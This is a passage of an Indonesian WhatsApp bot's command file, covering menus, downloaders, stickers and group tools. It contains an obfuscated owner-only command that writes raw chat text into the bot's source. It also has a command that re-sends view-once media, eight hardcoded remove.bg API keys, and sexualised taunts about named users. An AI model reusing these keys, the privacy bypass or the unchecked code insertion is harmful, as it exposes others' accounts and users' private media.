        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}
break

case 'mcstatus':
case 'mcstat': {
 if (!text) return replyviex("Silakan masukkan IP server Minecraft Java yang ingin diperiksa! *Contoh: .mcstat luckynetwork.id* ");

 try {
 const apiUrl = `https://fgsi1-restapi.hf.space/api/information/mcs?ip=${encodeURIComponent(text)}`;
 const response = await axios.get(apiUrl);
 const data = response.data;

 if (!data.status || !data.data || data.data.length === 0) {
 return replyviex("❌ Server Minecraft Java tidak ditemukan atau offline.");
 }

 // Mencari Data Server Minecraft Java
 const javaServer = data.data.find(server => server.type === "Java Edition");
 if (!javaServer) {
 return replyviex("❌ Tidak ada data untuk Java Edition pada server ini.");
 }

 // Build response message
 let message = `✅ *Info Status Server ini!*\n`;
 message += `🛠 Version : ${javaServer.version.name}\n`;
 message += `🎮 Players : ${javaServer.players.online}/${javaServer.players.max}\n`;
 message += `🖥️ Ping : ${javaServer.roundTripLatency || "N/A"}ms\n`;
 message += `🌐 MOTD : ${javaServer.motd.clean}\n`;

 replyviex(message);
 } catch (err) {
 console.error("❌ Error fetching Java Edition server info:", err.response?.data || err.message);
 replyviex("❌ Terjadi kesalahan saat mengambil informasi server Java Edition.");
 }
    break;
}
case "clearchat":
 case "clc": {
 if (!TradID) return replyviex(mess.owner)
 TradzSigma.chatModify({
 delete: true,
 lastMessages: [{
 key: m.key,
 messageTimestamp: m.messageTimestamp
 }]
 }, m.chat)
 }
break;


case 'cekfemboy': {
 if (!text) return replyviex('Masukin nama dulu, biar bisa gue nilai... seberapa layak lo dibisik "malam ini kamu punyaku ya~".');

 let target = text || m.pushName;

 const hash = Array.from(target).reduce((acc, char) => acc + char.charCodeAt(0), 0);
 const percent = Math.floor((hash * Date.now()) % 101);

 let rank = '';
 if (percent >= 95) {
 rank = 'UKE LEGENDARIS';
 } else if (percent >= 85) {
 rank = 'FEMBOY HOTLINE';
 } else if (percent >= 70) {
 rank = 'FEMBOY SIAGA 1';
 } else if (percent >= 50) {
 rank = 'FEMBOY NGEFLIRT';
 } else if (percent >= 30) {
 rank = 'FEMBOY TERPENDAM';
 } else {
 rank = 'TARGET FANTASI';
 }

 let komentar = '';
 if (percent >= 95) {
 komentar = 'Lo tuh femboy idaman sugar daddy. Dikit aja dikasih perhatian, langsung manja-manja sambil meringkuk di dada orang. Suara lo? ASMR-nya ngegoda setengah mati.';
 } else if (percent >= 85) {
 komentar = 'Dari cara lo ngetik aja udah kebaca: lo suka dipeluk dari belakang sambil dibisikin pelan. "Udah siap buat nakal belum?" dan lo cuma bisa ngangguk pelan.';
 } else if (percent >= 70) {
 komentar = 'Lo bukan cuma femboy... lo tuh pemicu dosa. Outfit lo selalu kebetulan *nempel banget*. Bikin yang lihat pengen langsung tarik dan bilang "ayo, kamar kosong ada nih."';
 } else if (percent >= 50) {
 komentar = 'Lo diem-diem horny. Di luar keliatan kalem, tapi pas malem sendirian, lo buka headset, pasang playlist "moan compilation", dan... ya, lo ngerti sendiri lanjutannya.';
 } else if (percent >= 30) {
 komentar = 'Aura lo tuh "aku malu, tapi mau". Sering banget dikira polos, padahal tab bookmark lo isinya *doujin* dan video-videonya full dengan tag yang... gak bisa dijelasin di sini.';
 } else {
 komentar = 'Lo bukan femboy. Tapi lo punya muka yang sering jadi thumbnail video "cowok straight dibikin leleh sama trap". Dan lo nonton... sampe habis. Diam-diam ngulang 3x.';
 }

 const notes = [
 'Note: Stop nyari "femboy gets bred" di search bar, lo ketauan.',
 'Note: Lo tuh bukan innocent, lo cuman belum ke-ekspos aja.',
 'Note: Lo suka bilang "iya kak..." pas voice? Jangan sok malu deh.',
 'Note: History lo isinya lebih orno dari VPN premium.',
 'Note: Lo udah bukan wibu biasa, lo tuh femboy enjoyer tingkat advance.',
 'Note: Kalau explore IG lo isinya cowok berseragam ketat... lo udah tau lah.',
 ];

 const pickNote = notes[Math.floor(Math.random() * notes.length)];

 replyviex(`👤 *${target}*\n🏅 *RANK:* ${rank}\n🔞 *${percent}% Femboy Power*\n\n${komentar}\n\n${pickNote}`);
}
break

case 'bratvid': case 'bratanim': case 'bratvideo':{
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    if (!text) return replyviex("[❗] Input teks tidak ditemukan! Kirim perintah dengan format: .bratvid <teks>");
        TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
        let brat = `https://fgsi1-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
        let response = await axios.get(brat, { responseType: "arraybuffer" });
        let videoBuffer = response.data;
        let stickerBuffer = await TradzSigma.sendVideoAsSticker(m.chat, videoBuffer, m, {
            packname: "Stiker By",
            author: "Yoimiya md",
        });
        console.log("Stiker berhasil dibuat:", stickerBuffer);
    } catch (err) {
        console.error("Error:", err);
        replyviex("[❗] Maaf, terjadi kesalahan saat mencoba membuat stiker video. Silakan coba lagi.");
    }
}
break;
case 'addcase': {
const _0x168a38 = _0x5145;
(function (_0x471080, _0x414be9) {
    const _0x5039cd = _0x5145, _0x52b15c = _0x471080();
    while (!![]) {
        try {
            const _0x5938a0 = parseInt(_0x5039cd(0x7b)) / (0x7 * -0x1bb + 0x7a5 * -0x1 + 0x13c3) + -parseInt(_0x5039cd(0x7a)) / (0x2 * -0x114a + 0xc0 * -0x15 + 0x3256) * (parseInt(_0x5039cd(0x7e)) / (-0x2240 + -0x12c3 + 0x4d2 * 0xb)) + -parseInt(_0x5039cd(0x7f)) / (0x7 * 0x556 + 0x7f6 + 0xb53 * -0x4) * (parseInt(_0x5039cd(0x83)) / (-0x208f + 0x2b * 0x3e + 0x162a)) + -parseInt(_0x5039cd(0x7d)) / (-0x6da + -0x11 * 0x1c3 + 0x1 * 0x24d3) * (-parseInt(_0x5039cd(0x74)) / (-0x234d + 0xf14 + 0x1440)) + -parseInt(_0x5039cd(0x82)) / (0x1 * 0x15f + -0x3 * 0x88e + -0x1df * -0xd) * (parseInt(_0x5039cd(0x81)) / (0x1 * 0x2635 + 0x134a + -0x3976)) + -parseInt(_0x5039cd(0x80)) / (0x682 + -0x251e + 0x1ea6) + parseInt(_0x5039cd(0x76)) / (0xbe3 + -0x131 * -0x11 + -0x2019) * (parseInt(_0x5039cd(0x78)) / (0xf89 * -0x1 + -0x7 * -0x556 + -0x15c5));
            if (_0x5938a0 === _0x414be9)
                break;
            else
                _0x52b15c['push'](_0x52b15c['shift']());
        } catch (_0x2221c3) {
            _0x52b15c['push'](_0x52b15c['shift']());
        }
    }
}(_0x164d, 0xa8ae0 + -0xa1 * -0xb78 + -0xbf81f));
if (!TradID)
    return reply(mess[_0x168a38(0x7c)][_0x168a38(0x84)]);
function _0x164d() {
    const _0x39fd30 = [
        '468788IZcJQP',
        '6437400sQKkVy',
        '18jwnkWR',
        '1913848DLJsPe',
        '20NLTpom',
        'owner',
        '3969HAqLXT',
        'kak\x20mana\x20c',
        '513491FPrWUp',
        'ase\x20nya',
        '348JQyiwr',
        'TradzID.js',
        '2PWZKSy',
        '523955fIeHyG',
        'only',
        '6366VmGQLc',
        '1527324rgTTDG'
    ];
    _0x164d = function () {
        return _0x39fd30;
    };
    return _0x164d();
}
function _0x5145(_0x2baadf, _0x2476b0) {
    const _0x41e27f = _0x164d();
    return _0x5145 = function (_0x485e9d, _0x1d9747) {
        _0x485e9d = _0x485e9d - (-0x12d2 + 0x1 * 0x1c97 + -0x951);
        let _0x50a102 = _0x41e27f[_0x485e9d];
        return _0x50a102;
    }, _0x5145(_0x2baadf, _0x2476b0);
}
if (!text)
    return replyviex(_0x168a38(0x75) + _0x168a38(0x77));
const fs = require('fs'), namaFile = _0x168a38(0x79);

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replyviex('Terjadi kesalahan saat menulis file:', err);
            } else {
                replyviex('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replyviex('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;
case 'liat': {
	
				if (!isAdmins && !TradID) return replyviex(mess.admin);
				if (!m.quoted) return replyviex(`Reply pesan view once-nya! 🙏`);
				if (m.quoted.mtype !== 'viewOnceMessageV2') return replyviex(`Hmm... ini bukan pesan view once Bos! 🤔`);
				let msg = m.quoted.message
				let type = Object.keys(msg)[0]
				let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				if (/video/.test(type)) {
					return TradzSigma.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
				} else if (/image/.test(type)) {
					return TradzSigma.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
				}
			}
			break;
case 'tagme': {
				TradzSigma.sendMessage(m.chat, { 
					text: `@${m.sender.split('@')[0]}`, 
					mentions: [m.sender] 
				})
			};
			break;
case "upteks":
case "romchat":{
 if (!text) return replyviex("contoh\n.chat selamat siang semuanya")
 const Kalender00011 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
 const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
await TradzSigma.sendMessage(m.chat, {
 react: {
 text: '🦚',
 key: m.key,
 }})
TradzSigma.sendMessage(`${global.chat}`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `Yoimiya RoM Chat`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: TradzSigma.decodeJid(TradzSigma.user.id) },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `PESAN DARI: ${pushname}`,
 body: `Dkirim Di: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
TradzSigma.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})
 //reply(`sukses mengirim pesan ke channel.`)
 TradzSigma.sendMessage(m.chat, {
 react: {
 text: '🚮',
 key: m.key,
 }})

}
break
case 'terabox': {
    if (!text) return replyviex(`Gunakan: ${prefix + command} <url>\n\nContoh: ${prefix + command} https://terabox.com/s/1B1nTfxPq9_Ib-rf_M_6oFg`);

    const axios = require("axios");

    async function teraboxdl(url) {
    await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
            const apiUrl = `https://teraboxdownloaderonline.com/api/download-m3u8?terabox_link=${encodeURIComponent(url)}`;
            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": `https://teraboxdownloaderonline.com/player?url=${encodeURIComponent(url)}`,
            };

            const response = await axios.get(apiUrl, { headers });

            const match = response.data.match(/#EXTINF:\d+,\s*(https[^\s]+)/);
            if (match && match[1]) {
                return { status: "success", video_url: match[1] };
            } else {
                return { status: "error", message: "❌ Video URL tidak ditemukan." };
            }
        } catch (error) {
            return { status: "error", message: "❌ Terjadi kesalahan saat mengambil data.", error: error.message };
        }
    }

    try {
        await TradzSigma.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        let result = await teraboxdl(text);
        if (result.status !== "success") return replyviex(result.message);

        await TradzSigma.sendMessage(m.chat, { react: { text: '📥', key: m.key } });

        await TradzSigma.sendMessage(m.chat, {
            video: { url: result.video_url },
            mimetype: 'video/mp4',
            caption: `✅ *Berhasil mengunduh dari Terabox!*`
        }, { quoted: m });

        await TradzSigma.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        replyviex("❌ Terjadi kesalahan.");
    }
}
break;
case 'aigen':
case 'aiimage': {
    if (!text) return replyviex(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);

    replyviex("🎨 Generating AI Image...");
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        const axios = require("axios");

        async function generateImage(prompt) {
            const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;

            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
            };

            let { data } = await axios.get(url, { headers });
            if (data && data.image_link) return { success: true, imageUrl: data.image_link };
            return { success: false, message: "❌ Gagal mendapatkan gambar!" };
        }

        let result = await generateImage(text);
        if (!result.success) return replyviex(result.message);

        await TradzSigma.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        await TradzSigma.sendMessage(m.chat, { 
            image: { url: result.imageUrl }, 
            caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
        }, { quoted: m });

        replyviex("✅ Gambar berhasil dibuat!");
    } catch (err) {
        console.error(err);
        replyviex("❌ Terjadi kesalahan saat membuat gambar!");
    }
}
break;
async function Upscale(imageBuffer) {
    try {
        const response = await fetch("https://lexica.qewertyy.dev/upscale", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                image_data: imageBuffer.toString("base64"), 
                format: "binary",
            }),
        })

        return Buffer.from(await response.arrayBuffer())
    } catch {
        return null
    }
}

case 'remini' : {
    TradzSigma.enhancer = TradzSigma.enhancer || {}

    if (m.sender in TradzSigma.enhancer)
        throw "❗Masih ada proses yang belum selesai. Silakan tunggu."

    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!mime) throw "❗Kirim/Reply foto.";
    if (!/image\/(jpe?g|png)/.test(mime)) throw `❗ Mimetype ${mime} tidak didukung.`

    TradzSigma.enhancer[m.sender] = true
    await TradzSigma.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    let img = await q.download?.()
    let enhancedImg = await Upscale(img)

    if (enhancedImg) {
        await TradzSigma.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
        TradzSigma.sendFile(
            m.chat,
            enhancedImg,
            "",
            "Done✅",
            m
        )
    } else {
        await TradzSigma.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
        replyviex("*Result:* Failed ");
    }

    delete TradzSigma.enhancer[m.sender]
}
break
case 'nobg':
case 'imagenobg':
case 'removebg':
case 'remove-bg': {
	
				if (!TradID) return reply(mess.premium);
				if (!/image/.test(mime)) return replyviex(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				if (/webp/.test(mime)) return replyviex(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				let remobg = require('remove.bg');
				let apirnobg = ["pvmbuSzyrip1ksmj9otVSogd", "jGaBWNXPP8LXV6KW3ovBWozE", "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj","xu2pZRhdyddJx48BrN9ntvjD","FAKQ7AtfrADtGmLsWVG9s9Yu","3eoq8Bd1JUxEU3Gi5AAmtxZ1"]
				await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
				try {
					let apinobg = await pickRandom(apirnobg)
					hmm = await 'remobg-' + getRandom('')
					localFile = await TradzSigma.downloadAndSaveMediaMessage(quoted, hmm)
					outputFile = await './library/hremo-' + getRandom('.png')
					await remobg.removeBackgroundFromImageFile({
						path: localFile,
						apiKey: apinobg,
						size: "regular",
						type: "auto",
						scale: "100%",
						outputFile
					}).then(async result => {
						TradzSigma.sendMessage(m.chat, {
							image: fs.readFileSync(outputFile),
							caption: mess.done
						}, {
							quoted: m
						})
						await fs.unlinkSync(localFile)
						await fs.unlinkSync(outputFile)
					})
				} catch (error) {
					console.log(error);
					replyviex('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break
case 'welcome': {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    if (!m.isGroup) return reply('Hanya bisa di dalam grup');
    if (!isBotAdmins) return reply('Bot harus jadi admin!');
    if (!isAdmins) return reply('Kamu bukan admin!');

    let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
    const chatId = m.chat;

    welcome[chatId] = welcome[chatId] || { status: false };
    welcome[chatId].status = !welcome[chatId].status;

    fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2));
    reply(`Welcome message *${welcome[chatId].status ? 'Enable' : 'Disable'}* di grup ini.`);
}
break;

case 'changewelcome': {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    if (!m.isGroup) return reply('Hanya bisa di dalam grup');
    if (!isBotAdmins) return reply('Bot harus jadi admin!');
    if (!isAdmins) return reply('Kamu bukan admin!');

    let [type, ...msg] = text.trim().split(' ');
    if (!['join', 'leave'].includes(type)) {
        return reply('Gunakan format:\n.changewelcome join <pesan>\n.changewelcome leave <pesan>\n\n@user ( nama )\n@group ( name grub )\n@tanggal ( date )\n\n*Contoh:* .changewelcome join Selamat datang @user di grub @group');
    }
    if (!msg.length) return reply(`Masukkan isi pesan ${type}`);

    let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
    const chatId = m.chat;

    welcome[chatId] = welcome[chatId] || { status: true };
    welcome[chatId][type] = msg.join(' ');

    fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2));
    reply(`Pesan welcome *${type}* berhasil diubah.`);
}
break;
case 'ytmp3': case 'ytmusik': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!text) return reply(example("Mana link ytnya sayang...."))
if (!text.startsWith("https://")) return reply("Link Tautan Tidak Valid")
await TradzSigma.sendMessage(m.chat, {react: {text: '🔍', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]

if (anu.status) {
let urlMp3 = anu.download.url
await TradzSigma.sendMessage(m.chat, {
                audio: {
                    url: urlMp3
                },
                mimetype: 'audio/mpeg',
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `${rees.title}` || 'Untitled',
                        body: `${namabot}`,
                        sourceUrl: `${rees.url}`,
                        thumbnailUrl: rees.thumbnail || 'https://example.com/default_thumbnail.jpg',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: xy });
} else {
return replyviex("*Woy Anj Hasil Nya Kagak Ketemu🫩*")
}
await TradzSigma.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "caisearch": {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    if (!text) return reply("⚡ *Contoh:* .caisearch Nahida");

    try {
